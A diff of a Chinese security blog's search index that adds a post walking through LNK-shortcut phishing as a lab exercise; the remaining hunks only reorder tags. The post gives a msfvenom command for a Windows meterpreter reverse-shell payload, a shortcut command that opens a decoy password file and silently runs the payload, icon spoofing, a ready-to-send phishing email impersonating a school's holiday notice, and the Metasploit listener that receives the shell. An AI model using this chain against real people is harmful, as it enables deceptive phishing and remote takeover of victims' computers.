@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>社工钓鱼之Lnk钓鱼基本的方式</title>
+      <link href="/2024/05/05/%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC%E4%B9%8BLnk%E9%92%93%E9%B1%BC%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%96%B9%E5%BC%8F/"/>
+      <url>/2024/05/05/%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC%E4%B9%8BLnk%E9%92%93%E9%B1%BC%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
+      
+        <content type="html"><![CDATA[<h1 id="社工钓鱼之Lnk钓鱼基本的方式"><a href="#社工钓鱼之Lnk钓鱼基本的方式" class="headerlink" title="社工钓鱼之Lnk钓鱼基本的方式"></a>社工钓鱼之Lnk钓鱼基本的方式</h1><h2 id="1-1-前言"><a href="#1-1-前言" class="headerlink" title="1.1 前言"></a>1.1 前言</h2><p>  网络钓鱼是社会工程学攻击方式之一，主要是通过对受害者心理弱点、本能反应、好奇心、信任、贪婪等心理陷阱进行诸如欺骗、伤害等危害手段！</p><p>  lnk 文件是用于指向其他文件的一种文件。 这些文件通常称为快捷方式文件，通常它以快捷方式放在硬盘上，以方便使用者快速的调用…这里快捷方式在钓鱼的优势是，可以写入免杀的shell代码，双击即可执行，进一步的调节下图标后，能更好的诱骗客户执行</p><p>  简单来说就是使用快捷方式执行cmd命令执行shell，从而诱导目标上钩</p><h3 id="1-1-1-实验步骤"><a href="#1-1-1-实验步骤" class="headerlink" title="1.1.1 实验步骤"></a>1.1.1 实验步骤</h3><p>  通过<code>msfvemon</code>生成一个后门文件,模拟《五一放假通知》诱导目标点击，通过msf监听上线，拿下目标主机shell权限，</p><p>准备环境: 外网ubantu（msf服务器） 、 模拟目标windows10 一台 、物理本机制作钓鱼文件。</p><h2 id="（二）Ink快捷方式钓鱼"><a href="#（二）Ink快捷方式钓鱼" class="headerlink" title="（二）Ink快捷方式钓鱼"></a>（二）Ink快捷方式钓鱼</h2><h3 id="2-1-msfvemon生成木马"><a href="#2-1-msfvemon生成木马" class="headerlink" title="2.1 msfvemon生成木马"></a>2.1 <code>msfvemon</code>生成木马</h3><p>注:<code>you_ip </code>为外网机器</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=you_ip <span class="attribute">LPORT</span>=8080 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><p><img src="https://img.qovv.cn/2024/05/05/663756b581d70.png"></p><h3 id="2-2-文件准备"><a href="#2-2-文件准备" class="headerlink" title="2.2 文件准备"></a>2.2 文件准备</h3><p>关于五一放假通知.docx 、shell.exe(msf生成)、 创建一个txt文件文件名为密码.txt ，创建密码.txt快捷方式，将word设置密码，从而诱导目标点击密码.txt</p><p><img src="https://img.qovv.cn/2024/05/05/663756b572a2b.png"></p><p><img src="https://img.qovv.cn/2024/05/05/663756b572e59.png"></p><p>shell.exe、密码.txt设置为隐藏模式,密码内容为 <code>pass:admin1234</code></p><p><img src="https://img.qovv.cn/2024/05/05/663756b572d4f.png"></p><p><img src="https://img.qovv.cn/2024/05/05/663756c6c71b4.png"></p><p>设置world密码</p><p><img src="https://img.qovv.cn/2024/05/05/663756c6c4062.png"></p><p>将文件压缩：</p><h2 id="（三）-快捷方式文件写入、图标更改"><a href="#（三）-快捷方式文件写入、图标更改" class="headerlink" title="（三） 快捷方式文件写入、图标更改"></a>（三） 快捷方式文件写入、图标更改</h2><p>右键密码.txt快捷方式</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\cmd.exe <span class="regexp">/c &quot;cmd /</span>c 密码.txt&amp;shell.exe</span><br></pre></td></tr></table></figure><p><img src="https://img.qovv.cn/2024/05/05/663756b577830.png"></p><h3 id="3-1-图标更改"><a href="#3-1-图标更改" class="headerlink" title="3.1 图标更改"></a>3.1 图标更改</h3><p>右键属性–更改图标—选择跟txt文档一样的图标即可</p><p><img src="https://img.qovv.cn/2024/05/05/663756b572e59.png"></p><h2 id="（四）钓鱼邮箱拟写"><a href="#（四）钓鱼邮箱拟写" class="headerlink" title="（四）钓鱼邮箱拟写"></a>（四）钓鱼邮箱拟写</h2><p> 钓鱼模板</p><p>亲爱的小张老师:</p><p>   根据《国务院办公厅关于2024年部分节假日安排的通知》（国办发明电〔2023〕7号）精神，结合学校实际，现就2024年“五一”劳动节假期工作通知如下：</p><p>一、放假时间安排</p><p>  5月1日至5日放假调休，共5天。4月28日（星期日）补5月2日（星期四）的课程、5月11日（星期六）补5月3日（星期五）的课程。</p><p>注意:具体细节请查看附件1</p><p>​                                          </p><p>​                                                                                                                                                                                      信息安全学院 信息中心</p><p>发给目标：</p><p><img src="https://img.qovv.cn/2024/05/05/663756c6c4e8b.png"></p><p>附件1为准备好的木马文件</p><h2 id="（五）模拟接收文件"><a href="#（五）模拟接收文件" class="headerlink" title="（五）模拟接收文件"></a>（五）模拟接收文件</h2><p>  登录window10 发现有文件发送点开文件将附件下载下来</p><p><img src="https://img.qovv.cn/2024/05/05/663756c6c0297.png"></p><p><img src="https://img.qovv.cn/2024/05/05/663756d32868c.png"></p><p>下载附件</p><p><img src="https://img.qovv.cn/2024/05/05/663756d329129.png"></p><h2 id="结尾：msf上线"><a href="#结尾：msf上线" class="headerlink" title="结尾：msf上线"></a>结尾：msf上线</h2><p>  运行密码.txt 查看msf服务器上线，拿下 <code>administrtor</code> 管理员权限</p><p>msf监听：一套组合拳</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lhost 0.0.0.0</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lport 8080</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://img.qovv.cn/2024/05/05/663756d33bb9d.png"></p><p><img src="https://img.qovv.cn/2024/05/05/663756dc97e98.png"></p><p>本次实验结束：</p><p>  不足点：shell 没有进行免杀,如开启defender 等杀毒软件，shell直接被检测杀掉，</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> lnk钓鱼 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络钓鱼 </tag>
+            
+            <tag> msf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>VUE学习之路-第一章</title>
       <link href="/2024/01/06/VUE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF-%E7%AC%AC%E4%B8%80%E7%AB%A0/"/>
       <url>/2024/01/06/VUE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF-%E7%AC%AC%E4%B8%80%E7%AB%A0/</url>
@@ -49,9 +76,9 @@
             
             <tag> web安全 </tag>
             
-            <tag> src </tag>
-            
             <tag> 未授权访问 </tag>
+            
+            <tag> src </tag>
             
             <tag> 弱口令 </tag>
             
@@ -82,9 +109,9 @@
             
             <tag> web安全 </tag>
             
-            <tag> 未授权访问 </tag>
-            
             <tag> php安全 </tag>
+            
+            <tag> 未授权访问 </tag>
             
         </tags>
       
@@ -409,13 +436,13 @@
       
         <tags>
             
-            <tag> web安全 </tag>
-            
             <tag> 渗透 </tag>
             
             <tag> 靶场练习 </tag>
             
             <tag> 提权 </tag>
+            
+            <tag> web安全 </tag>
             
         </tags>
       
@@ -469,9 +496,9 @@
       
         <tags>
             
-            <tag> xss </tag>
-            
             <tag> web安全 </tag>
+            
+            <tag> xss </tag>
             
         </tags>
       
